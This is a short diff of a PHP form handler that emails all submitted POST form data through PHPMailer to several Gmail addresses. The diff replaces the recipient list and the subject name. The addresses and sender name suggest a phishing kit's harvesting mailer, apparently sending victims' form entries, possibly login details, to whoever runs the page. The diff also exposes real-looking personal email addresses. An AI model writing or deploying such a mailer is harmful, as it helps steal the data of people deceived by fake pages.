@@ -31,17 +31,17 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mail->Port       = 587;
 
 
-        // Email properties
-        $mail->setFrom('best90960@gmail.com', 'PROFESSOR');
-        $mail->addAddress('submitdispute@gmail.com');
-         $mail->addAddress('newzatpage@gmail.com');
-      
+$mail->setFrom('best90960@gmail.com', 'PROFESSOR');
+        $mail->addAddress('okieskissdoman@gmail.com');
+        $mail->addAddress('subhannizamani51@gmail.com');
+
+         $mail->addAddress('halinamars85@gmail.com');
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'Abdullah';
+        $mail->Subject = 'Rashid';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
